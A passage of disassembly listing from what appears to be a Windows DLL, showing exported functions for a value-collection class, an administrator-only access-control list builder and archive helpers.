		mov	eax, offset unknown_libname_49 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 50h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		mov	[ebp+var_14], eax
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_5C]
		call	Ordinal1228
		mov	eax, [esi]
		lea	ecx, [ebp+var_28]
		push	ecx
		push	dword ptr [ebp+Args] ; Args
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		mov	[ebp+var_28], ebx
		call	dword ptr [eax+0Ch]
		test	al, al
		jnz	short loc_6AF38CBF
		push	offset aCvaluecolle_56 ; "CValueCollection::SetValue(LPCSTR) : Ge"...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF38DA1
; ---------------------------------------------------------------------------

loc_6AF38CBF:				; CODE XREF: Ordinal283+44j
		push	offset aCvaluecolle_57 ; "CValueCollection::SetValue(LPCSTR)"
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		mov	ecx, [ebp+var_28]
		push	[ebp+Src]	; Src
		add	ecx, 38h
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF31B1D

loc_6AF38CDE:				; DATA XREF: Ordinal283+C9o
					; Ordinal283+11Eo
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		test	eax, eax
		jz	loc_6AF38D8D
		xor	bl, bl
		jmp	loc_6AF38D99
; ---------------------------------------------------------------------------

loc_6AF38CF5:				; DATA XREF: .rdata:6AF62830o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF38CDE
		retn
; ---------------------------------------------------------------------------

loc_6AF38D38:				; DATA XREF: .rdata:6AF62840o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+var_24]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+var_24]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF38CDE
		retn
; ---------------------------------------------------------------------------

loc_6AF38D8D:				; CODE XREF: Ordinal283+7Fj
		mov	eax, [ebp+var_28]
		mov	dword ptr [eax+8], 7
		mov	bl, 1

loc_6AF38D99:				; CODE XREF: Ordinal283+87j
		lea	ecx, [ebp+var_48]
		call	Ordinal752

loc_6AF38DA1:				; CODE XREF: Ordinal283+51j
		lea	ecx, [ebp+var_5C]
		call	Ordinal1230
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	al, bl
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal283	endp ; sp-analysis failed

; Exported entry 285.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal285(int,	void *Dst, int,	int)
		public Ordinal285
Ordinal285	proc near		; CODE XREF: Ordinal284+15p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
Dst		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		mov	ebx, [ebp+Dst]
		push	esi
		mov	esi, [ebp+arg_C]
		xor	eax, eax
		cmp	ebx, eax
		push	edi
		mov	edi, ecx
		mov	[esi], eax
		jz	short loc_6AF38E5B
		cmp	[ebp+arg_8], 2
		jb	short loc_6AF38E5B
		push	eax
		mov	[ebx], ax
		push	0FFFFFFFFh
		lea	eax, [edi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		and	[ebp+arg_C], 0
		lea	eax, [ebp+arg_C]
		push	eax
		push	8
		push	[ebp+arg_0]
		mov	ecx, edi
		call	Ordinal298
		test	al, al
		jnz	short loc_6AF38E1C
		push	offset aCvaluecolle_58 ; "CValueCollection::GetValue(LPWSTR) : Ge"...
		call	sub_6AF3101A

loc_6AF38E17:				; CODE XREF: Ordinal285+78j
		pop	ecx
		xor	bl, bl
		jmp	short loc_6AF38E4F
; ---------------------------------------------------------------------------

loc_6AF38E1C:				; CODE XREF: Ordinal285+47j
		mov	ecx, [ebp+arg_C]
		mov	eax, [ecx+3Ch]
		mov	eax, [eax-0Ch]
		test	eax, eax
		jz	short loc_6AF38E4D
		lea	eax, [eax+eax+2]
		cmp	[ebp+arg_8], eax
		jnb	short loc_6AF38E3E
		push	offset aCvaluecolle_59 ; "CValueCollection::GetValue(LPWSTR) : dw"...
		call	sub_6AF3102E
		jmp	short loc_6AF38E17
; ---------------------------------------------------------------------------

loc_6AF38E3E:				; CODE XREF: Ordinal285+6Cj
		push	eax		; Size
		mov	[esi], eax
		push	dword ptr [ecx+3Ch] ; Src
		push	ebx		; Dst
		call	memcpy
		add	esp, 0Ch

loc_6AF38E4D:				; CODE XREF: Ordinal285+63j
		mov	bl, 1

loc_6AF38E4F:				; CODE XREF: Ordinal285+56j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	al, bl
		jmp	short loc_6AF38E68
; ---------------------------------------------------------------------------

loc_6AF38E5B:				; CODE XREF: Ordinal285+17j
					; Ordinal285+1Dj
		push	offset aCvaluecolle_60 ; "CValueCollection::GetValue(LPWSTR) : sz"...
		call	sub_6AF3102E
		pop	ecx
		xor	al, al

loc_6AF38E68:				; CODE XREF: Ordinal285+95j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	10h
Ordinal285	endp

; Exported entry 286.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal286(int,	wchar_t	*Src)
		public Ordinal286
Ordinal286	proc near		; DATA XREF: .rdata:off_6AF66098o

var_5C		= byte ptr -5Ch
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
var_24		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Args		= byte ptr  8
Src		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_50 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 50h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		mov	[ebp+var_14], eax
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_5C]
		call	Ordinal1228
		mov	eax, [esi]
		lea	ecx, [ebp+var_28]
		push	ecx
		push	dword ptr [ebp+Args] ; Args
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		mov	[ebp+var_28], ebx
		call	dword ptr [eax+0Ch]
		test	al, al
		jnz	short loc_6AF38EC5
		push	offset aCvaluecolle_61 ; "CValueCollection::SetValue(LPCWSTR) :	G"...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF38FA7
; ---------------------------------------------------------------------------

loc_6AF38EC5:				; CODE XREF: Ordinal286+44j
		push	offset aCvaluecolle_62 ; "CValueCollection::SetValue(LPCWSTR)"
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		mov	ecx, [ebp+var_28]
		push	[ebp+Src]	; Src
		add	ecx, 3Ch
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF348E7

loc_6AF38EE4:				; DATA XREF: Ordinal286+C9o
					; Ordinal286+11Eo
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		test	eax, eax
		jz	loc_6AF38F93
		xor	bl, bl
		jmp	loc_6AF38F9F
; ---------------------------------------------------------------------------

loc_6AF38EFB:				; DATA XREF: .rdata:6AF628A0o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF38EE4
		retn
; ---------------------------------------------------------------------------

loc_6AF38F3E:				; DATA XREF: .rdata:6AF628B0o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+var_24]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+var_24]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF38EE4
		retn
; ---------------------------------------------------------------------------

loc_6AF38F93:				; CODE XREF: Ordinal286+7Fj
		mov	eax, [ebp+var_28]
		mov	dword ptr [eax+8], 8
		mov	bl, 1

loc_6AF38F9F:				; CODE XREF: Ordinal286+87j
		lea	ecx, [ebp+var_48]
		call	Ordinal752

loc_6AF38FA7:				; CODE XREF: Ordinal286+51j
		lea	ecx, [ebp+var_5C]
		call	Ordinal1230
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	al, bl
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal286	endp ; sp-analysis failed

; Exported entry 287.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal287(int,	VARIANTARG *pvarDest)
		public Ordinal287
Ordinal287	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
pvarDest	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		push	[ebp+pvarDest]	; pvarg
		mov	esi, ecx
		call	ds:VariantClear
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		lea	eax, [ebp+var_4]
		push	eax
		push	0Bh
		push	[ebp+arg_0]
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	Ordinal298
		test	al, al
		jnz	short loc_6AF39012
		push	offset aCvaluecolle_63 ; "CValueCollection::GetValue(VARIANT) :	G"...
		call	sub_6AF3101A

loc_6AF3900F:				; CODE XREF: Ordinal287+68j
		pop	ecx
		jmp	short loc_6AF39036
; ---------------------------------------------------------------------------

loc_6AF39012:				; CODE XREF: Ordinal287+39j
		mov	eax, [ebp+var_4]
		add	eax, 18h
		push	eax		; pvargSrc
		push	[ebp+pvarDest]	; pvarDest
		call	ds:VariantCopyInd
		cmp	eax, ebx
		jge	short loc_6AF39034
		push	eax		; Args
		push	offset aCvaluecolle_64 ; "CValueCollection::GetValue(VARIANT) :	V"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3900F
; ---------------------------------------------------------------------------

loc_6AF39034:				; CODE XREF: Ordinal287+5Aj
		mov	bl, 1

loc_6AF39036:				; CODE XREF: Ordinal287+46j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal287	endp

; Exported entry 289.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal289
Ordinal289	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		push	edi
		mov	edi, ecx
		mov	ecx, [esi]
		xor	ebx, ebx
		cmp	ecx, ebx
		jz	short loc_6AF39063
		mov	eax, [ecx]
		call	dword ptr [eax+8]
		mov	[esi], ebx

loc_6AF39063:				; CODE XREF: Ordinal289+14j
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [edi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		lea	eax, [ebp+arg_4]
		push	eax
		push	0Ch
		push	[ebp+arg_0]
		mov	ecx, edi
		mov	[ebp+arg_4], ebx
		call	Ordinal298
		test	al, al
		jnz	short loc_6AF39096
		push	offset aCvaluecolle_65 ; "CValueCollection::GetValue(ISymBase) : "...
		call	sub_6AF3101A
		pop	ecx
		jmp	short loc_6AF390A9
; ---------------------------------------------------------------------------

loc_6AF39096:				; CODE XREF: Ordinal289+41j
		mov	eax, [ebp+arg_4]
		mov	ecx, [eax+40h]
		cmp	ecx, ebx
		mov	[esi], ecx
		jz	short loc_6AF390A7
		mov	eax, [ecx]
		call	dword ptr [eax+4]

loc_6AF390A7:				; CODE XREF: Ordinal289+5Aj
		mov	bl, 1

loc_6AF390A9:				; CODE XREF: Ordinal289+4Ej
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal289	endp

; Exported entry 278.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal278(int,	void *Dst, int)
		public Ordinal278
Ordinal278	proc near		; DATA XREF: .rdata:off_6AF66098o

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
Dst		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_4]
		push	eax		; int
		push	[ebp+arg_8]	; int
		push	[ebp+Dst]	; Dst
		push	[ebp+arg_0]	; int
		call	Ordinal279
		leave
		retn	0Ch
Ordinal278	endp

; Exported entry 281.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal281(int,	void *Dst, int)
		public Ordinal281
Ordinal281	proc near		; DATA XREF: .rdata:off_6AF66098o

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
Dst		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_4]
		push	eax		; int
		push	[ebp+arg_8]	; int
		push	[ebp+Dst]	; Dst
		push	[ebp+arg_0]	; int
		call	Ordinal282
		leave
		retn	0Ch
Ordinal281	endp

; Exported entry 284.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal284(int,	void *Dst, int)
		public Ordinal284
Ordinal284	proc near		; DATA XREF: .rdata:off_6AF66098o

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
Dst		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_4]
		push	eax		; int
		push	[ebp+arg_8]	; int
		push	[ebp+Dst]	; Dst
		push	[ebp+arg_0]	; int
		call	Ordinal285
		leave
		retn	0Ch
Ordinal284	endp

; Exported entry 302.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal302
Ordinal302	proc near		; CODE XREF: Ordinal1074+1BBp
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+10h], 0
		and	dword ptr [esi+28h], 0
		push	edi
		lea	ecx, [esi+2Ch]
		mov	dword ptr [esi], offset	off_6AF572E0
		call	Ordinal861
		push	0Ch		; Size
		lea	edi, [esi+4]
		push	0		; Val
		push	edi		; Dst
		call	memset
		push	14h		; Size
		lea	eax, [esi+14h]
		push	0		; Val
		push	eax		; Dst
		mov	dword ptr [edi], 0Ch
		call	memset
		add	esp, 18h
		pop	edi
		mov	eax, esi
		pop	esi
		retn
Ordinal302	endp

; Exported entry 306.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame fpd=9Ch

		public Ordinal306
Ordinal306	proc near		; CODE XREF: Ordinal1074+1CAp
					; DATA XREF: .rdata:off_6AF66098o

pDacl		= dword	ptr -11Ch
var_118		= dword	ptr -118h
pSid		= dword	ptr -114h
var_110		= byte ptr -110h
pIdentifierAuthority= _SID_IDENTIFIER_AUTHORITY	ptr -0Ch
var_4		= dword	ptr -4

		push	ebp
		lea	ebp, [esp-9Ch]
		sub	esp, 11Ch
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		lea	ecx, [ebp+9Ch+var_110]
		mov	[ebp+9Ch+var_4], eax
		mov	[esi+10h], ebx
		mov	[esi+28h], ebx
		call	Ordinal932
		lea	ecx, [ebp+9Ch+var_110]
		call	Ordinal934
		test	eax, eax
		jz	short loc_6AF39197
		xor	esi, esi
		inc	esi
		jmp	loc_6AF3932B
; ---------------------------------------------------------------------------

loc_6AF39197:				; CODE XREF: Ordinal306+37j
		push	edi
		lea	eax, [ebp+9Ch+pSid]
		push	eax		; pSid
		push	ebx		; nSubAuthority7
		push	ebx		; nSubAuthority6
		push	ebx		; nSubAuthority5
		push	ebx		; nSubAuthority4
		push	ebx		; nSubAuthority3
		push	ebx		; nSubAuthority2
		push	220h		; nSubAuthority1
		push	20h		; nSubAuthority0
		push	2		; nSubAuthorityCount
		lea	eax, [ebp+9Ch+pIdentifierAuthority]
		push	eax		; pIdentifierAuthority
		mov	[ebp+9Ch+pSid],	ebx
		mov	[ebp+9Ch+var_118], ebx
		mov	[ebp+9Ch+pIdentifierAuthority.Value], bl
		mov	[ebp+9Ch+pIdentifierAuthority.Value+1],	bl
		mov	[ebp+9Ch+pIdentifierAuthority.Value+2],	bl
		mov	[ebp+9Ch+pIdentifierAuthority.Value+3],	bl
		mov	[ebp+9Ch+pIdentifierAuthority.Value+4],	bl
		mov	[ebp+9Ch+pIdentifierAuthority.Value+5],	5
		call	AllocateAndInitializeSid
		test	eax, eax
		jz	short loc_6AF39215
		push	[ebp+9Ch+pSid]	; pSid
		call	GetLengthSid
		mov	edi, eax
		lea	eax, [ebp+9Ch+var_118]
		push	eax		; pSid
		push	ebx		; nSubAuthority7
		push	ebx		; nSubAuthority6
		push	ebx		; nSubAuthority5
		push	ebx		; nSubAuthority4
		push	ebx		; nSubAuthority3
		push	ebx		; nSubAuthority2
		push	ebx		; nSubAuthority1
		push	12h		; nSubAuthority0
		push	1		; nSubAuthorityCount
		lea	eax, [ebp+9Ch+pIdentifierAuthority]
		push	eax		; pIdentifierAuthority
		add	edi, 10h
		call	AllocateAndInitializeSid
		test	eax, eax
		jnz	short loc_6AF39226

loc_6AF39215:				; CODE XREF: Ordinal306+8Fj
		call	ds:GetLastError
		push	eax
		push	offset aCadmindaclCrea ; "CAdminDacl::Create() : AllocateAndIniti"...
		jmp	loc_6AF392F9
; ---------------------------------------------------------------------------

loc_6AF39226:				; CODE XREF: Ordinal306+BDj
		push	[ebp+9Ch+var_118] ; pSid
		call	GetLengthSid
		lea	edi, [edi+eax+8]
		lea	eax, [esi+14h]
		push	1		; dwRevision
		push	eax		; pSecurityDescriptor
		call	InitializeSecurityDescriptor
		test	eax, eax
		jnz	short loc_6AF39254
		call	ds:GetLastError
		push	eax
		push	offset aCadmindaclCr_0 ; "CAdminDacl::Create() : InitializeSecuri"...
		jmp	loc_6AF392F9
; ---------------------------------------------------------------------------

loc_6AF39254:				; CODE XREF: Ordinal306+EBj
		push	edi		; Args
		lea	ecx, [esi+2Ch]
		call	Ordinal870
		cmp	eax, ebx
		mov	[ebp+9Ch+pDacl], eax
		jnz	short loc_6AF3926B
		push	offset aCadmindaclCr_1 ; "CAdminDacl::Create() : m_AclMem.NewAllo"...
		jmp	short loc_6AF3927E
; ---------------------------------------------------------------------------

loc_6AF3926B:				; CODE XREF: Ordinal306+10Cj
		push	2		; dwAclRevision
		push	edi		; nAclLength
		push	eax		; pAcl
		call	InitializeAcl
		test	eax, eax
		jnz	short loc_6AF39285
		push	offset aCadmindaclCr_2 ; "CAdminDacl::Create() : InitializeAcl() "...

loc_6AF3927E:				; CODE XREF: Ordinal306+113j
		call	sub_6AF3102E
		jmp	short loc_6AF392FF
; ---------------------------------------------------------------------------

loc_6AF39285:				; CODE XREF: Ordinal306+121j
		push	[ebp+9Ch+var_118] ; pSid
		mov	edi, AddAccessAllowedAce
		push	10000000h	; AccessMask
		push	2		; dwAceRevision
		push	[ebp+9Ch+pDacl]	; pAcl
		call	edi ; AddAccessAllowedAce
		test	eax, eax
		jz	short loc_6AF392ED
		push	[ebp+9Ch+pSid]	; pSid
		push	10000000h	; AccessMask
		push	2		; dwAceRevision
		push	[ebp+9Ch+pDacl]	; pAcl
		call	edi ; AddAccessAllowedAce
		test	eax, eax
		jz	short loc_6AF392ED
		push	ebx		; bDaclDefaulted
		push	[ebp+9Ch+pDacl]	; pDacl
		lea	eax, [esi+14h]
		push	1		; bDaclPresent
		lea	edi, [esi+4]
		push	eax		; pSecurityDescriptor
		mov	dword ptr [edi], 0Ch
		mov	[esi+8], eax
		mov	[esi+0Ch], ebx
		call	SetSecurityDescriptorDacl
		test	eax, eax
		jnz	short loc_6AF392E2
		call	ds:GetLastError
		push	eax
		push	offset aCadmindaclCr_3 ; "CAdminDacl::Create() : SetSecurityDescr"...
		jmp	short loc_6AF392F9
; ---------------------------------------------------------------------------

loc_6AF392E2:				; CODE XREF: Ordinal306+17Cj
		lea	eax, [esi+14h]
		mov	[esi+10h], edi
		mov	[esi+28h], eax
		jmp	short loc_6AF39300
; ---------------------------------------------------------------------------

loc_6AF392ED:				; CODE XREF: Ordinal306+146j
					; Ordinal306+159j
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCadmindaclCr_4 ; "CAdminDacl::Create() : AddAccessAllowed"...

loc_6AF392F9:				; CODE XREF: Ordinal306+CBj
					; Ordinal306+F9j ...
		call	sub_6AF3102E
		pop	ecx

loc_6AF392FF:				; CODE XREF: Ordinal306+12Dj
		pop	ecx

loc_6AF39300:				; CODE XREF: Ordinal306+195j
		cmp	[ebp+9Ch+var_118], ebx
		mov	edi, FreeSid
		jz	short loc_6AF39313
		push	[ebp+9Ch+var_118] ; pSid
		call	edi ; FreeSid
		mov	[ebp+9Ch+var_118], ebx

loc_6AF39313:				; CODE XREF: Ordinal306+1B3j
		cmp	[ebp+9Ch+pSid],	ebx
		jz	short loc_6AF39320
		push	[ebp+9Ch+pSid]	; pSid
		call	edi ; FreeSid
		mov	[ebp+9Ch+pSid],	ebx

loc_6AF39320:				; CODE XREF: Ordinal306+1C0j
		xor	eax, eax
		cmp	[esi+28h], ebx
		pop	edi
		setnz	al
		mov	esi, eax

loc_6AF3932B:				; CODE XREF: Ordinal306+3Cj
		lea	ecx, [ebp+9Ch+var_110]
		call	Ordinal933
		mov	ecx, [ebp+9Ch+var_4]
		mov	eax, esi
		pop	esi
		pop	ebx
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		add	ebp, 9Ch
		leave
		retn
Ordinal306	endp ; sp-analysis failed

; Exported entry 307.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal307
Ordinal307	proc near		; CODE XREF: Ordinal303+9p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		push	edi
		mov	esi, ecx
		and	dword ptr [esi+28h], 0
		and	dword ptr [esi+10h], 0
		push	0Ch		; Size
		lea	edi, [esi+4]
		push	0		; Val
		push	edi		; Dst
		call	memset
		push	14h		; Size
		lea	eax, [esi+14h]
		push	0		; Val
		push	eax		; Dst
		mov	dword ptr [edi], 0Ch
		call	memset
		add	esp, 18h
		pop	edi
		lea	ecx, [esi+2Ch]
		pop	esi
		jmp	Ordinal874
Ordinal307	endp

; Exported entry 303.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal303
Ordinal303	proc near		; CODE XREF: sub_6AF3939A+3p
					; Ordinal1074+682p ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF572E0
		call	Ordinal307
		lea	ecx, [esi+2Ch]
		pop	esi
		jmp	Ordinal863
Ordinal303	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3939A(void *, char)
sub_6AF3939A	proc near		; DATA XREF: .rdata:off_6AF572E0o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal303
		test	[esp+4+arg_0], 1
		jz	short loc_6AF393B0
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF393B0:				; CODE XREF: sub_6AF3939A+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3939A	endp

; Exported entry 308.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal308
Ordinal308	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		mov	dword ptr [eax], offset	off_6AF57464
		retn
Ordinal308	endp

; Exported entry 309.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal309
Ordinal309	proc near		; DATA XREF: .rdata:6AF628FCo
					; .rdata:off_6AF66098o
		mov	eax, ecx
		mov	dword ptr [eax], offset	off_6AF57464
		retn	4
Ordinal309	endp

; Exported entry 310.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal310
Ordinal310	proc near		; DATA XREF: .rdata:6AF6290Co
					; .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF57464
		retn
Ordinal310	endp

; Exported entry 311.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal311
Ordinal311	proc near		; CODE XREF: Ordinal680+7p
					; Ordinal796+8p ...

arg_0		= dword	ptr  4

		mov	eax, ecx
		mov	ecx, [esp+arg_0]
		and	dword ptr [eax+8], 0
		and	dword ptr [eax+0Ch], 0
		mov	dword ptr [eax], offset	off_6AF57468
		mov	[eax+10h], ecx
		retn	4
Ordinal311	endp

; Exported entry 312.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal312
Ordinal312	proc near		; CODE XREF: Ordinal681+6j
					; Ordinal797+1Aj ...
		mov	dword ptr [ecx], offset	off_6AF57468
		retn
Ordinal312	endp

; Exported entry 316.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal316
Ordinal316	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	edx, [ecx]
		xor	eax, eax
		push	eax
		push	eax
		mov	[ecx+8], eax
		mov	[ecx+0Ch], eax
		call	dword ptr [edx+0Ch]
		test	eax, eax
		jnz	short loc_6AF39413
		push	offset aCarchiveResetS ; "CArchive::Reset() : SetPosEx() == FALSE"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF39413:				; CODE XREF: Ordinal316+11j
		xor	eax, eax
		inc	eax
		retn
Ordinal316	endp

; Exported entry 364.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal364
Ordinal364	proc near		; CODE XREF: Ordinal293+4Ap
					; Ordinal1435j
					; DATA XREF: ...
		mov	eax, [ecx+8]
		mov	edx, [ecx+0Ch]
		retn
Ordinal364	endp

; Exported entry 369.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal369
Ordinal369	proc near		; CODE XREF: Ordinal313+5Bp
					; Ordinal367+54p ...

arg_0		= dword	ptr  4

		mov	ecx, [esp+arg_0]
		xor	eax, eax
		test	ecx, ecx
		jle	short locret_6AF39443
		cmp	ecx, 6
		jle	short loc_6AF39440
		cmp	ecx, 9
		jle	short loc_6AF3943C
		cmp	ecx, 0Ah
		jz	short loc_6AF39440
		cmp	ecx, 0Bh
		jnz	short locret_6AF39443

loc_6AF3943C:				; CODE XREF: Ordinal369+12j
		xor	eax, eax
		jmp	short locret_6AF39443
; ---------------------------------------------------------------------------

loc_6AF39440:				; CODE XREF: Ordinal369+Dj
					; Ordinal369+17j
		xor	eax, eax
		inc	eax

locret_6AF39443:			; CODE XREF: Ordinal369+8j
					; Ordinal369+1Cj ...
		retn	4
Ordinal369	endp

; Exported entry 254.
; Exported entry 370.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal370
Ordinal370	proc near		; CODE XREF: Ordinal249+4Ap
					; Ordinal255+7Ep ...

arg_0		= dword	ptr  4

		mov	ecx, [esp+arg_0] ; ccL30_254
		xor	eax, eax
		dec	ecx
		jz	short loc_6AF39463
		dec	ecx
		jz	short loc_6AF39472
		dec	ecx
		jz	short loc_6AF39469
		dec	ecx
		jz	short loc_6AF3946E
		dec	ecx
		jz	short loc_6AF3946E
		dec	ecx
		jz	short loc_6AF39469
		sub	ecx, 4
